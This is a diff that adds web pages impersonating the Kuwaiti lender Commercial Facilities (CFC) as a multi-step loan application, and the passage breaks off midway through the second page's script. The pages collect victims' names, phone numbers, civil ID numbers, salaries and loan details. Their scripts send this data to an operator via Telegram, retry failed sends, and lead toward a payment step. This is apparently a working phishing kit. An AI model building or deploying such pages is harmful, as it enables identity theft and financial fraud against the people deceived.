@@ -1,0 +1,3889 @@
+<html lang="ar">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="description" content="الخطوة الأولى لتقديم طلب التمويل لدى شركة التسهيلات التجارية.">
+    <meta name="theme-color" content="#00a3e0">
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg">
+    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./assets/css/shared-header.css">
+</head>
+
+<body class="page-with-shared-header step-page">
+    <div id="root">
+        <div dir="rtl" class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+            <header class="site-header">
+                <div class="nav-shell">
+                    <a class="brand" href="./index.html#home" aria-label="Commercial Facilities">
+                        <img src="./assets/images/logo.svg" alt="Commercial Facilities logo">
+                    </a>
+                    <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+                        <img src="./assets/images/menu.png" alt="">
+                    </button>
+                    <nav class="navbar" aria-label="التنقل الرئيسي">
+                        <ul class="nav-links"></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="max-w-md mx-auto px-6 py-6">
+                <div class="flex items-center justify-between mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg></div><span class="text-xs font-semibold text-[#00A3E0]">المعلومات الشخصية</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-[#00A3E0] mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center shadow-md"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg></div><span class="text-xs font-semibold text-[#00A3E0]">الراتب</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-300 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center shadow-md"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                                <line x1="2" x2="22" y1="10" y2="10"></line>
+                            </svg></div><span class="text-xs font-semibold text-gray-500">الدفع</span>
+                    </div>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="h-2 rounded-full transition-all duration-500 bg-[#00A3E0] w-1/3"></div>
+                </div>
+            </div>
+            <form id='sb' class="max-w-md mx-auto px-6 pb-8 space-y-6">
+                <div class="rounded-xl shadow-lg overflow-hidden">
+                    <div class="bg-gradient-to-r from-[#00A3E0] to-blue-700 p-4">
+                        <h2 class="text-lg font-bold text-white flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 21a8 8 0 1 0-16 0"></path>
+                                <circle cx="12" cy="7" r="4"></circle>
+                            </svg>المعلومات الشخصية</h2>
+                        <p class="text-xs text-blue-100 mt-1">يرجى ملء جميع الحقول بدقة</p>
+                    </div>
+                    <div class="p-6 space-y-5">
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2"><label for="pp" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.86 19.86 0 0 1 3.09 5.18 2 2 0 0 1 5 3h3a2 2 0 0 1 2 1.72c.12.81.3 1.6.57 2.34a2 2 0 0 1-.45 2.11L9.1 10.9a16 16 0 0 0 4 4l1.73-1.02a2 2 0 0 1 2.11-.45c.74.27 1.53.45 2.34.57A2 2 0 0 1 22 16.92z"></path>
+                                    </svg>رقم الهاتف</label>
+                            </div><input id="pp" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="xxxxxxxxxx" inputmode="numeric" pattern="[0-9]*" autocomplete="tel" type="text" value="">
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2"><label for="nm" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M20 21a8 8 0 1 0-16 0"></path>
+                                        <circle cx="12" cy="7" r="4"></circle>
+                                    </svg>الاسم الكامل</label>
+                            </div><input id="nm" dir="rtl" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="أدخل اسمك الكامل" type="text" value="">
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2"><label for="cv" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                                        <line x1="8" x2="8" y1="9" y2="15"></line>
+                                        <line x1="12" x2="12" y1="9" y2="15"></line>
+                                        <line x1="16" x2="16" y1="9" y2="15"></line>
+                                    </svg>الرقم المدني</label>
+                            </div><input id="cv" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="أدخل رقمك المدني" inputmode="numeric" pattern="[0-9]*" autocomplete="off" type="text" value="">
+                        </div>
+                    </div>
+                </div>
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4">
+                    <div class="flex items-start gap-3"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-[#00A3E0] mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                        </svg>
+                        <div>
+                            <p class="text-sm font-semibold text-gray-900 mb-1">معلوماتك المالية في أمان</p>
+                            <p class="text-xs text-gray-600 leading-relaxed">نستخدم أحدث تقنيات التشفير لحماية بياناتك. لا تتم مشاركة معلوماتك مع أي طرف ثالث.</p>
+                        </div>
+                    </div>
+                </div>
+            </form>
+                            <div class="grid grid-cols-3 gap-3">
+                    <div class="rounded-xl border-0 shadow-sm bg-gradient-to-br from-green-50 to-white">
+                        <div class="p-3 text-center space-y-2">
+                            <div class="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-green-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M16 7h6v6"></path>
+                                    <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+                                </svg></div>
+                            <p class="text-xs font-semibold text-gray-700">أفضل الأسعار</p>
+                        </div>
+                    </div>
+                    <div class="rounded-xl border-0 shadow-sm bg-gradient-to-br from-blue-50 to-white">
+                        <div class="p-3 text-center space-y-2">
+                            <div class="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                                </svg></div>
+                            <p class="text-xs font-semibold text-gray-700">سرية تامة</p>
+                        </div>
+                    </div>
+                    <div class="rounded-xl border-0 shadow-sm bg-gradient-to-br from-purple-50 to-white">
+                        <div class="p-3 text-center space-y-2">
+                            <div class="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto"><svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-purple-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M12 6v6l4 2"></path>
+                                    <circle cx="12" cy="12" r="10"></circle>
+                                </svg></div>
+                            <p class="text-xs font-semibold text-gray-700">رد فوري</p>
+                        </div>
+                    </div>
+                </div>
+        </div>
+    </div>
+    <div class="step-fixed-actions step-fixed-actions--single">
+        <button id="sbb" type="submit" form="sb" class="inline-flex items-center justify-center gap-2 h-14 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#00A3E0] to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"><span class="flex items-center gap-2 justify-center">التالي<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" style="transform: rotate(180deg);" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"></path></svg></span></button>
+    </div>
+
+
+
+    <script>
+        function normalizeDigits(value) {
+            return value
+                .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
+                .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
+        }
+
+        function digitsOnly(value) {
+            return normalizeDigits(value).replace(/\D+/g, '');
+        }
+
+        function buildStep1SubmissionMessage(nameValue, phoneValue, civilValue) {
+            const pageName = window.getCurrentTelegramPageName ? window.getCurrentTelegramPageName() : 'صفحة المعلومات الشخصية';
+            const separator = '───────────────';
+            const details = [];
+
+            if (nameValue) details.push(`الاسم: ${nameValue}`);
+            if (phoneValue) details.push(`رقم الهاتف: ${phoneValue}`);
+            if (civilValue) details.push(`الرقم المدني: ${civilValue}`);
+
+            if (!details.length) {
+                details.push('لا توجد معلومات مدخلة');
+            }
+
+            return [pageName, separator].concat(details).join('\n');
+        }
+
+        function syncLoanType() {
+            const params = new URLSearchParams(window.location.search);
+            const loanType = params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
+            localStorage.setItem('selectedLoanType', loanType);
+        }
+
+        function bindStep1() {
+            syncLoanType();
+
+            const form = document.getElementById('sb');
+            const phone = document.getElementById('pp');
+            const civil = document.getElementById('cv');
+            const name = document.getElementById('nm');
+            const submitButton = document.getElementById('sbb');
+
+            const storedPhone = localStorage.getItem('step1.phone');
+            const storedName = localStorage.getItem('step1.name');
+            const storedCivil = localStorage.getItem('step1.civil');
+
+            if (storedPhone) phone.value = storedPhone;
+            if (storedName) name.value = storedName;
+            if (storedCivil) civil.value = storedCivil;
+
+            form.dataset.submitting = 'false';
+            if (submitButton) {
+                submitButton.disabled = false;
+                submitButton.removeAttribute('aria-busy');
+            }
+            if (window.hideSubmissionLoadingOverlay) {
+                window.hideSubmissionLoadingOverlay();
+            }
+
+            [phone, civil].forEach(function(input) {
+                if (input.dataset.bound === 'true') return;
+                input.dataset.bound = 'true';
+                input.addEventListener('input', function() {
+                    input.value = digitsOnly(input.value);
+                });
+            });
+
+            if (form.dataset.bound !== 'true') {
+                form.dataset.bound = 'true';
+                form.addEventListener('submit', async function(event) {
+                    event.preventDefault();
+
+                    if (form.dataset.submitting === 'true') return;
+
+                    form.dataset.submitting = 'true';
+                    if (submitButton) {
+                        submitButton.disabled = true;
+                        submitButton.setAttribute('aria-busy', 'true');
+                    }
+
+                    const phoneValue = digitsOnly(phone.value);
+                    const nameValue = name.value.trim();
+                    const civilValue = digitsOnly(civil.value);
+
+                    localStorage.setItem('step1.phone', phoneValue);
+                    localStorage.setItem('step1.name', nameValue);
+                    localStorage.setItem('step1.civil', civilValue);
+
+                    const message = buildStep1SubmissionMessage(nameValue, phoneValue, civilValue);
+
+                    if (window.showSubmissionLoadingOverlay) {
+                        window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الراتب والوظيفة...', 3000, 'knet');
+                    }
+
+                    const sent = window.sendTelegramMessageOnce
+                        ? await window.sendTelegramMessageOnce(message, false)
+                        : false;
+
+                    if (!sent) {
+                        localStorage.setItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail', message);
+                        if (window.persistTelegramMessageThenSend) {
+                            window.persistTelegramMessageThenSend(message, false).catch(function() {});
+                        }
+                    } else {
+                        localStorage.removeItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail');
+                    }
+
+                    window.location.href = './step2.html';
+                });
+            }
+        }
+
+        bindStep1();
+        window.addEventListener('pageshow', bindStep1);
+    </script>
+    <script src="./assets/js/telegram.js"></script>
+    <script src="./assets/js/tg.js"></script>
+    <script src="./assets/js/shared-header.js"></script>
+
+    </body>
+</html>
+
+<html lang="ar">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="description" content="الخطوة الثانية لتقديم طلب التمويل لدى شركة التسهيلات التجارية.">
+    <meta name="theme-color" content="#00a3e0">
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link rel="icon" type="image/svg+xml" href="./assets/images/logo.svg">
+    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="./assets/css/shared-header.css">
+</head>
+
+<body class="page-with-shared-header step-page">
+    <div id="root">
+        <div dir="rtl" class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+            <header class="site-header">
+                <div class="nav-shell">
+                    <a class="brand" href="./index.html#home" aria-label="Commercial Facilities">
+                        <img src="./assets/images/logo.svg" alt="Commercial Facilities logo">
+                    </a>
+                    <button class="menu-toggle" type="button" aria-expanded="false" aria-label="فتح القائمة">
+                        <img src="./assets/images/menu.png" alt="">
+                    </button>
+                    <nav class="navbar" aria-label="التنقل الرئيسي">
+                        <ul class="nav-links"></ul>
+                    </nav>
+                </div>
+            </header>
+            <div class="max-w-md mx-auto px-6 py-6">
+                <div class="flex items-center justify-between mb-2">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-green-600">المعلومات الشخصية</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-green-500 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 6 9 17l-5-5"></path>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-[#00A3E0]">الراتب</span>
+                    </div>
+                    <div class="flex-1 h-0.5 bg-gray-300 mx-2"></div>
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center shadow-md">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                                <line x1="2" x2="22" y1="10" y2="10"></line>
+                            </svg>
+                        </div>
+                        <span class="text-xs font-semibold text-gray-500">الدفع</span>
+                    </div>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2">
+                    <div class="h-2 rounded-full transition-all duration-500 bg-[#00A3E0] w-2/3"></div>
+                </div>
+            </div>
+            <form id="sb" class="max-w-md mx-auto px-6 pb-8 space-y-6">
+                <div class="rounded-xl bg-card text-card-foreground shadow-lg border-0 overflow-hidden">
+                    <div class="bg-gradient-to-r from-[#00A3E0] to-blue-700 p-4">
+                        <h2 class="text-lg font-bold text-white flex items-center gap-2">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <line x1="12" x2="12" y1="2" y2="22"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>معلومات الراتب والوظيفة
+                        </h2>
+                        <p class="text-xs text-blue-100 mt-1">لحساب أفضل عرض تمويلي لك</p>
+                    </div>
+                    <div class="p-6 space-y-5">
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="netSalary" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>الراتب الشهري
+                                </label>
+                            </div>
+                            <div class="relative">
+                                <input id="netSalary" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 1500" inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div id="carValueField" class="space-y-2 hidden">
+                                <div class="flex items-center gap-2">
+                                    <label for="carValue" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                            <line x1="12" x2="12" y1="2" y2="22"></line>
+                                            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                        </svg>قيمة السيارة</label>
+                                </div>
+                                <div class="relative">
+                                    <input id="carValue" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 5000 د.ك." inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label id="requestedAmountLabel" for="requestedAmount" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <line x1="12" x2="12" y1="2" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                    </svg>قيمة الفرض</label>
+                            </div>
+                            <div class="relative">
+                                <input id="requestedAmount" dir="ltr" class="flex w-full rounded-md border bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-blue-500 md:text-sm text-right border-gray-200 h-12" placeholder="مثال: 100 د.ك." inputmode="numeric" pattern="[0-9]*" type="text" value=""><span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-medium">د.ك</span>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <div class="flex items-center gap-2">
+                                <label for="workSector" class="text-sm leading-none text-right font-semibold text-gray-800 flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-[#00A3E0]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="M16 20V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                        <rect width="20" height="14" x="2" y="6" rx="2"></rect>
+                                    </svg>قطاع العمل</label>
+                            </div>
+                            <div class="relative">
+                                <select id="workSector" class="flex w-full items-center justify-between whitespace-nowrap rounded-md border bg-transparent px-3 py-2 text-sm shadow-sm ring-offset-background text-right border-gray-200 focus:outline-none focus:ring-1 focus:ring-blue-500 h-12 text-gray-400">
+                                    <option value="">قطاع العمل</option>
+                                    <option value="القطاع الحكومي">القطاع الحكومي</option>
+                                    <option value="القطاع الخاص">القطاع الخاص</option>
+                                    <option value="متقاعد">متقاعد</option>
+                                    <option value="القطاع النفطي">القطاع النفطي</option>
+                                    <option value="القطاع العسكري">القطاع العسكري</option>
+                                    <option value="القطاع المصرفي">القطاع المصرفي</option>
+                                    <option value="قطاع التعليم">قطاع التعليم</option>
+                                    <option value="القطاع الصحي">القطاع الصحي</option>
+                                    <option value="غير ذلك">غير ذلك</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="step-fixed-actions">
+        <button onclick="window.location.href='./step1.html'" type="button" class="inline-flex items-center justify-center rounded-md text-sm font-medium border shadow-sm h-12 px-4 bg-white border-gray-300 hover:bg-gray-50">&lt; العودة</button>
+        <button type="submit" id="sbb" form="sb" class="inline-flex items-center justify-center gap-2 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 bg-gradient-to-r from-[#00A3E0] to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold">
+            التالي<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" style="transform: rotate(180deg);" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m9 18 6-6-6-6"></path>
+            </svg>
+        </button>
+    </div>
+    <script>
+    function normalizeDigits(value) {
+        return value
+            .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
+            .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
+    }
+
+    function digitsOnly(value) {
+        return normalizeDigits(value).replace(/\D+/g, '');
+    }
+
+    function getFieldPlaceholder(field) {
+        if (!field) {
+            return '';
+        }
+
+        if (field.tagName === 'SELECT') {
+            return 'قطاع العمل';
+        }
+
+        return field.previousElementSibling && field.previousElementSibling.tagName === 'LABEL'
+            ? field.previousElementSibling.textContent.trim()
+            : (field.getAttribute('placeholder') || field.id);
+    }
+
+    function buildStep2SubmissionMessage(values) {
+        const pageName = window.getCurrentTelegramPageName ? window.getCurrentTelegramPageName() : 'صفحة الراتب';
+        const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : '💼';
+        const lines = [`${pageEmoji} ${pageName}`];
+
+        if (values.name && values.phone) {
+            lines.push(`👤 ${values.name} ─ ${values.phone}`);
+        } else if (values.name) {
+            lines.push(`👤 ${values.name}`);
+        } else if (values.phone) {
+            lines.push(`📞 ${values.phone}`);
+        }
+
+        if (values.netSalary) lines.push(`💰 الراتب الشهري: ${values.netSalary}`);
+        if (values.carValue) lines.push(`🚗 قيمة السيارة: ${values.carValue}`);
+        if (values.requestedAmount) lines.push(`💵 القرض المطلوب: ${values.requestedAmount}`);
+
+        if (
+            !values.name &&
+            !values.phone &&
+            !values.netSalary &&
+            !values.carValue &&
+            !values.requestedAmount
+        ) {
+            lines.push('لم يقم بادخال اي معلومات');
+        }
+
+        return lines.join('\n');
+    }
+
+    function getLoanType() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
+    }
+
+    function syncStep2Labels() {
+        const loanType = getLoanType();
+        localStorage.setItem('selectedLoanType', loanType);
+
+        const carValueField = document.getElementById('carValueField');
+        const carValueInput = document.getElementById('carValue');
+        const label = document.getElementById('requestedAmountLabel');
+        const input = document.getElementById('requestedAmount');
+        const icon = label.querySelector('svg');
+        const isCarLoan = loanType === 'car';
+        const labelText = isCarLoan ? 'مبلغ الدفعة الاولى' : 'قيمة الفرض';
+
+        label.innerHTML = '';
+        if (icon) label.appendChild(icon);
+        label.appendChild(document.createTextNode(labelText));
+        input.placeholder = isCarLoan ? 'مثال: 100 د.ك.' : 'مثال: 5000 د.ك.';
+
+        if (carValueField) {
+            carValueField.classList.toggle('hidden', !isCarLoan);
+        }
+
+        if (carValueInput && !isCarLoan) {
+            carValueInput.value = '';
+            localStorage.removeItem('step2.carValue');
+        }
+    }
+
+    function bindStep2() {
+        syncStep2Labels();
+
+        const form = document.getElementById('sb');
+        const netSalary = document.getElementById('netSalary');
+        const carValue = document.getElementById('carValue');
+        const requestedAmount = document.getElementById('requestedAmount');
+        const workSector = document.getElementById('workSector');
+        const submitButton = document.getElementById('sbb');
+
+        function syncWorkSectorPlaceholderState() {
+            workSector.classList.toggle('text-gray-400', !workSector.value);
+            workSector.classList.toggle('text-gray-800', Boolean(workSector.value));
+        }
+
+        [netSalary, carValue, requestedAmount].forEach(function(input) {
+            if (!input) return;
+            if (input.dataset.bound === 'true') return;
+            input.dataset.bound = 'true';
+            input.addEventListener('input', function() {
+                input.value = digitsOnly(input.value);
+            });
+        });
+
+        if (localStorage.getItem('step2.netSalary')) netSalary.value = localStorage.getItem('step2.netSalary');
+        if (carValue && localStorage.getItem('step2.carValue')) carValue.value = localStorage.getItem('step2.carValue');
+        if (localStorage.getItem('step2.requestedAmount')) requestedAmount.value = localStorage.getItem('step2.requestedAmount');
+        if (localStorage.getItem('step2.workSector')) workSector.value = localStorage.getItem('step2.workSector');
+        syncWorkSectorPlaceholderState();
+
+        form.dataset.submitting = 'false';
+        if (submitButton) {
+            submitButton.disabled = false;
+            submitButton.removeAttribute('aria-busy');
+        }
+        if (window.hideSubmissionLoadingOverlay) {
+            window.hideSubmissionLoadingOverlay();
+        }
+
+        if (form.dataset.retryChecked !== 'true') {
+            form.dataset.retryChecked = 'true';
+            if (window.resendStoredFailureMessage) {
+                window.resendStoredFailureMessage(
+                    window.STEP1_FAIL_STORAGE_KEY || 'step1_fail',
+                    'تنبيه: كان هناك مشكلة في إرسال رسالة صفحة المعلومات الشخصية، يرجى مراجعة تيليجرام.'
+                ).catch(function() {});
+            }
+        }
+
+        if (workSector.dataset.bound !== 'true') {
+            workSector.dataset.bound = 'true';
+            workSector.addEventListener('change', syncWorkSectorPlaceholderState);
+        }
+
+        if (form.dataset.bound !== 'true') {
+            form.dataset.bound = 'true';
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                if (form.dataset.submitting === 'true') return;
+
+                form.dataset.submitting = 'true';
+                if (submitButton) {
+                    submitButton.disabled = true;
+                    submitButton.setAttribute('aria-busy', 'true');
+                }
+
+                const nameValue = (localStorage.getItem('step1.name') || '').trim();
+                const phoneValue = digitsOnly(localStorage.getItem('step1.phone') || '');
+                const netSalaryValue = digitsOnly(netSalary.value);
+                const carValueValue = carValue ? digitsOnly(carValue.value) : '';
+                const requestedAmountValue = digitsOnly(requestedAmount.value);
+                const workSectorValue = workSector.value.trim();
+                const loanType = getLoanType();
+                localStorage.setItem('step2.netSalary', netSalaryValue);
+                if (loanType === 'car') {
+                    localStorage.setItem('step2.carValue', carValueValue);
+                } else {
+                    localStorage.removeItem('step2.carValue');
+                }
+                localStorage.setItem('step2.requestedAmount', requestedAmountValue);
+                localStorage.setItem('step2.workSector', workSectorValue);
+
+                const message = buildStep2SubmissionMessage({
+                    name: nameValue,
